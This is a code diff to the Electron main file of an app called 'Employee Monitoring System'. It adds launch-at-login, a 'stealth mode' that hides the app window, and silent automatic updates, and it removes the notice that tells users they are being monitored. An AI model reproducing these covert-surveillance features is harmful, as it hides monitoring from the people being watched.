@@ -1,12 +1,22 @@
-// Modules to control application life and create native browser window
 const {app, BrowserWindow} = require('electron')
 const ChildProcess = require('child_process');
-
+const AutoLaunch = require('auto-launch');
 const path = require('path')
 const log = require('electron-log');
 const {autoUpdater} = require("electron-updater");
 const { Notification } = require('electron')
+var autoLauncher = new AutoLaunch({
+    name: "Employee Monitoring System"
+});
 
+autoLauncher.isEnabled().then(function(isEnabled) {
+	if (isEnabled) {
+		return;
+	}
+	autoLauncher.enable();
+}).catch(function (err) {
+	throw err;
+});
 
 function showNotification (title, body) {
 	const notification = {
@@ -40,12 +50,10 @@ function createWindow () {
 	mainWindow.loadFile('index.html');
 }
 
-
 function start_client_app() {
 	var newProcess = ChildProcess.exec(`"${__dirname}\\engine\\client_app\\client_app.exe" "${app.getPath("userData")}"`, (err, sout, ster) => {
 		console.log(err, sout, ster)
 	});
-	showNotification("Client Application Started", "Monitoring your system has started. You will be underf supervision.");
 	processes.push(newProcess);
 
 	newProcess.on("exit", function () {
@@ -53,31 +61,48 @@ function start_client_app() {
 	});
 }
 
-// This method will be called when Electron has finished
-// initialization and is ready to create browser windows.
-// Some APIs can only be used after this event occurs.
+function check_stealth_mode() {
+	var done = false;
+	return new Promise((resolve, reject) => {
+		ChildProcess.exec(`python "${__dirname}\\engine\\doer.py" "${app.getPath("userData")}" check_stealth_mode`, function(err, data){
+			if (data == 1)
+				done = true;
+			resolve(done);
+		});
+	});
+}
 
-app.whenReady().then(() => {
-	createWindow();
-	start_client_app();
-	app.on('activate', function () {
-		// On macOS it's common to re-create a window in the app when the
-		// dock icon is clicked and there are no other windows open.
-		if (BrowserWindow.getAllWindows().length === 0) createWindow()
+let isSingleInstance = app.requestSingleInstanceLock()
+if (!isSingleInstance) {
+	app.quit()
+} else {
+	app.whenReady().then(async () => {
+		if (isSingleInstance) {
+			autoUpdater.checkForUpdatesAndNotify();
+			start_client_app();
+			const is_stealth_mode = await check_stealth_mode();
+			if (!is_stealth_mode){
+				createWindow();
+			}
+			app.on('activate', function () {
+				if (BrowserWindow.getAllWindows().length === 0) createWindow()
+			});	
+		}
 	})
-})
+}
 
-app.on('ready-to-show', () => {
-	autoUpdater.checkForUpdatesAndNotify();
-  }
-);
+autoUpdater.on('checking-for-update', () => {
+});
+autoUpdater.on('update-not-available', () => {
+});
 
 autoUpdater.on('update-available', () => {
-	mainWindow.webContents.send('update_available');
+	showNotification("Update Available", "New update will be downloaded and wil get installed automatically.")
 });
 
 autoUpdater.on('update-downloaded', () => {
-	mainWindow.webContents.send('update_downloaded');
+	showNotification("Update Downloaded", "Application will now quit and start the installation of the new Update.")
+	autoUpdater.quitAndInstall(true, true);
 });
 
 // Quit when all windows are closed.
